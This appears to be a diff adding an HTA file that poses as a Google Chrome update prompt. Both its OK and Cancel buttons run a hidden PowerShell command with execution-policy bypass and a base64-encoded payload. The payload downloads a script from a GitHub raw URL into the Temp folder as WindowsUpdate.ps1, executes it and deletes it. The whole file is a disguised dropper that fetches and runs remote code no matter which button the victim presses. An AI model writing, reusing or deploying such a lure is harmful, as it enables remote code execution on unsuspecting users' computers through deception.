@@ -1,0 +1,124 @@
+<html>
+<head>
+    <title>Google Chrome automatically updates</title>
+    <HTA:APPLICATION
+        ID="oHTA"
+        APPLICATIONNAME="Update Chrome"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        CAPTION="yes"
+        ICON="icon.ico"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+        WINDOWSTATE="normal"
+    />
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+            font-size: 20px;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 37.5px;
+            border-radius: 18.75px;
+            box-shadow: 0 5px 12.5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 500px;
+        }
+
+        h1 {
+            font-size: 30px;
+            margin-bottom: 25px;
+        }
+
+        p {
+            font-size: 20px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        .button {
+            padding: 18.75px 37.5px;
+            border: none;
+            border-radius: 37.5px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 12.5px 0;
+            transition: background-color 0.3s ease;
+        }
+
+        .accept-button {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .accept-button:hover {
+            background-color: #45a049;
+        }
+
+        .cancel-button {
+            background-color: #f44336;
+            color: white;
+        }
+
+        .cancel-button:hover {
+            background-color: #e53935;
+        }
+
+        .button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+    </style>
+
+    <script type="text/javascript">
+        // Función que se ejecuta al hacer clic en "Aceptar"
+        function ejecutarComando1() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                 var comando = 'cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -encodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBlAG0AYQBrAGUAZABpAGUALwBVAEMATgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBwAHMAbgBjAC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAJgAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABjAGEAbgBkAHIAYQBkAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUALgBwAHMAMQAnACAALQBGAG8AcgBjAGUA"';
+               
+				shell.Run(comando, 1, true);  // Ejecutar el comando
+            } catch (e) {
+                alert("Error: " + e.message);
+            }
+        }
+
+        // Función que se ejecuta al hacer clic en "Cancelar"
+        function ejecutarComando2() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                 var comando = 'cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -encodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBlAG0AYQBrAGUAZABpAGUALwBVAEMATgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBwAHMAbgBjAC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAJgAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABjAGEAbgBkAHIAYQBkAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUALgBwAHMAMQAnACAALQBGAG8AcgBjAGUA"';
+               
+				 
+				shell.Run(comando, 1, true);  // Ejecutar el comando
+            } catch (e) {
+                alert("Error: " + e.message);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Google Chrome automatically updates</h1>
+        <p>Click "OK" to begin the update...</p>
+        
+        <!-- Botones -->
+        <button class="button accept-button" onclick="ejecutarComando1()">OK</button>
+        <button class="button cancel-button" onclick="ejecutarComando2()">Cancel</button>
+    </div>
+</body>
+</html>
